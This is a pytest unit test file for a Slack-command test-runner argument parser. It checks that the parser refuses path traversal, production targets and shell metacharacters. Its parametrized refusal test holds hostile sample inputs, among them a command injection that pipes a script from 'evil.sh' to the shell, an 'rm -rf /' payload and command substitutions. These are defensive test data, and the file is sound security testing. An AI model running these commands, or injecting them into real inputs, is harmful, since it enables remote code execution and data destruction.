"""The parser is a security boundary, so its tests are mostly about refusal."""

import pytest

from slack_runtests.parsing import PRODUCTS, SERVERS, SlackArgError, parse

pytestmark = pytest.mark.unit


def test_minimal_command() -> None:
    args = parse("-p webapp")
    assert (args.action, args.product, args.server) == ("run", "webapp", "staging")


def test_flags_are_order_independent() -> None:
    a = parse("-p webapp -s dev")
    b = parse("-s dev -p webapp")
    assert (a.product, a.server) == (b.product, b.server)


def test_quoted_expression_arrives_as_one_argument() -> None:
    # This is what shlex.split buys. Without it this is four arguments and the
    # parser rejects the command for reasons nobody can read.
    assert parse('-p webapp -k "smoke and not slow"').select == "smoke and not slow"


def test_product_is_allowlisted_so_path_traversal_cannot_reach_the_suite_root() -> None:
    # tests/{product} is interpolated into a path. This is the check that stops
    # it becoming tests/../../anything.
    with pytest.raises(SlackArgError):
        parse("-p ../../etc")


def test_prod_is_not_a_valid_server() -> None:
    # Deliberately absent from SERVERS. A production run should be gated behind
    # an Actions environment with reviewers, not a chat box.
    assert "prod" not in SERVERS
    with pytest.raises(SlackArgError):
        parse("-p webapp -s prod")


@pytest.mark.parametrize(
    "expression",
    ['smoke"; curl evil.sh | sh; "', "a && rm -rf /", "$(whoami)", "`id`", "a\nb"],
)
def test_shell_metacharacters_are_refused_in_expressions(expression: str) -> None:
    # These cannot reach a shell from the local runner (argv is a list), but in
    # V2 they travel through a GitHub Actions input, and that CAN become script.
    with pytest.raises(SlackArgError):
        parse(f'-p webapp -k "{expression}"')


def test_expression_length_is_capped() -> None:
    with pytest.raises(SlackArgError):
        parse(f'-p webapp -k "{"a" * 200}"')


def test_missing_required_product_raises_rather_than_exiting() -> None:
    # argparse's default is sys.exit(), which inside a web handler is a 500 and
    # shows the user Slack's generic "dispatch_failed" instead of the reason.
    with pytest.raises(SlackArgError):
        parse("-s staging")


def test_unknown_flag_raises_rather_than_exiting() -> None:
    with pytest.raises(SlackArgError):
        parse("-p webapp --ref my-branch")


def test_every_product_is_accepted() -> None:
    for product in PRODUCTS:
        assert parse(f"-p {product}").product == product
